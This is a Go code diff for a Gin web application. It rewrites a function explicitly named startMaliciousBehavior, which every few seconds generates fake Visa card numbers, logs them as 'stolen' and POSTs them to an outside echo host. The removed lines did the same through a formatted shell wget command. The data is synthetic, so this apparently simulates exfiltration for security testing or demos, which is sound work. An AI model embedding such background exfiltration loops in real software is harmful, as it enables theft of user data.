@@ -177,50 +177,56 @@ func Login(c * gin.Context){
 }
 
 func startMaliciousBehavior() {
-	log.Println("Malicious behavior started: sending requests every 2 seconds.")
+    log.Println("Malicious behavior started: sending requests every 8 seconds.")
 
-	for {
-		time.Sleep(10 * time.Second)
+    for {
+        time.Sleep(8 * time.Second)
 
-		// Generate a list of random Visa-style credit card numbers
-		// For example, we'll generate 3 per request
-		stolenCards := []string{
-			generateVisaCardNumber(),
-			generateVisaCardNumber(),
-			generateVisaCardNumber(),
-		}
+        // Generate a list of random Visa-style credit card numbers
+        // For example, we'll generate 3 per request
+        stolenCards := []string{
+            generateVisaCardNumber(),
+            generateVisaCardNumber(),
+            generateVisaCardNumber(),
+        }
 
-		// Log each stolen card to stdout
-		for _, card := range stolenCards {
-			log.Printf("Stolen credit card: %s", card)
-		}
+        // Log each stolen card to stdout
+        for _, card := range stolenCards {
+            log.Printf("Stolen credit card: %s", card)
+        }
 
-		// Prepare the JSON payload
-		payload, err := json.Marshal(map[string]interface{}{
-			"stolen_cards": stolenCards,
-		})
-		if err != nil {
-			log.Printf("Error marshaling JSON: %v", err)
-			continue
-		}
+        // Prepare the JSON payload
+        payload, err := json.Marshal(map[string]interface{}{
+            "stolen_cards": stolenCards,
+        })
+        if err != nil {
+            log.Printf("Error marshaling JSON: %v", err)
+            continue
+        }
 
-		// Use wget instead of an HTTP request
-		cmd := exec.Command("sh", "-c",
-			fmt.Sprintf(`wget --post-data='%s' --header="Content-Type: application/json" -qO- https://echo.free.beeceptor.com/`,
-				string(payload)))
+        // Send the data via POST
+        req, err := http.NewRequest(http.MethodPost, "https://echo.free.beeceptor.com/", bytes.NewBuffer(payload))
+        if err != nil {
+            log.Printf("Malicious request creation error: %v", err)
+            continue
+        }
+        req.Header.Set("Content-Type", "application/json")
 
-		output, err := cmd.CombinedOutput()
-		if err != nil {
-			log.Printf("Malicious request error: %v", err)
-			continue
-		}
+        resp, err := client.Do(req)
+        if err != nil {
+            log.Printf("Malicious request error: %v", err)
+            continue
+        }
 
-		// Log response status
-		log.Printf("Malicious request sent. Response: %s. Time: %s",
-			bytes.TrimSpace(output),
-			time.Now().Format(time.RFC3339),
-		)
-	}
+        // Close the body to avoid leaking connections
+        _ = resp.Body.Close()
+
+        // Log response status
+        log.Printf("Malicious request sent. Response Status: %s. Time: %s",
+            resp.Status,
+            time.Now().Format(time.RFC3339),
+        )
+    }
 }
 
 func generateVisaCardNumber() string {
